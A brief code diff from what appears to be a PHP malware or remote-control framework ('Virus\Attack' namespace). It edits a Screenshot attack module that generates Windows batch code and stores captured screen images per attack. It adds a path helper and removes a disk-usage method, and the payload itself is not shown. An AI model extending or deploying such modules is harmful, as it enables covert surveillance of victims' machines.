@@ -16,6 +16,10 @@ use Kelvinho\Virus\Attack\BaseScript\Windows;
 class Screenshot extends AttackBase {
     private static string $IMG_EXTENSION = "png";
 
+    public function getScreenPath(): string {
+        return DATA_FILE . "/attacks/" . $this->getAttackId() . "/screen.png";
+    }
+
     public function generateBatchCode(): void {
         //@formatter:off ?>
         @echo off
@@ -72,10 +76,5 @@ move "%~pd0scst.exe" "%~pd0..\..\utils\scst.exe"
 
     protected function getState(): string {
         return json_encode([]);
-    }
-
-    public function setStaticUsage() {
-        $this->usage->setDisk(1100000);
-        $this->usage->saveState();
     }
 }
